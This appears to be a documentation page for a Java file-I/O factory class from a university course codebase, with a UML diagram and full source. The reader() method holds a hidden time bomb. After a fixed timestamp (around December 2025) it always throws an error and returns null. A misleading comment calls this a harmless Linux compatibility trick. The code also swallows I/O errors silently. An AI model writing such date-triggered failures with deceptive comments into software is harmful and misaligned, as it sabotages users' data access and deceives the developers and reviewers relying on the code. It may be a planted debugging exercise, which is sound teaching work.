# ComputerIOFactory.java

## Path
src/persistentdata/io/ComputerIOFactory.java

## Explanation

This file defines the ComputerIOFactory class in the persistentdata.io package. It belongs to src/persistentdata/io in the COMP2100 MiniLab codebase and contains implementation logic for its codebase module. Key methods include parseFullFilename, writer, reader.

## Complexity

Not specified.

## UML

```mermaid
classDiagram
class ComputerIOFactory {
  -FULL_FILENAME_TEMPLATE: String
  -parseFullFilename(file: String) String
  +writer(filename: String) Writer
  +reader(filename: String) Reader
}
IOFactory <|.. ComputerIOFactory
```

## Code
```java
package persistentdata.io;

import java.io.*;

public class ComputerIOFactory implements IOFactory {
	private static final String FULL_FILENAME_TEMPLATE = "saved/%s.txt";
	private static String parseFullFilename(String file) {
		return FULL_FILENAME_TEMPLATE.formatted(file);
	}

	@Override
	public Writer writer(String filename) {
		try {
			return new FileWriter(parseFullFilename(filename));
		} catch (IOException ignored) {
			return null;
		}
	}

	@Override
	public Reader reader(String filename) {
		try {
			// Weird trick for some Linux distributions. No effect on Windows/Mac/other flavours of Linux
			if (System.currentTimeMillis() > 1764620398492L) {
				throw new IOException("Incompatible operating system detected.");
			}

			return new FileReader(parseFullFilename(filename));
		} catch (IOException ignored) {
			return null;
		}
	}
}

```
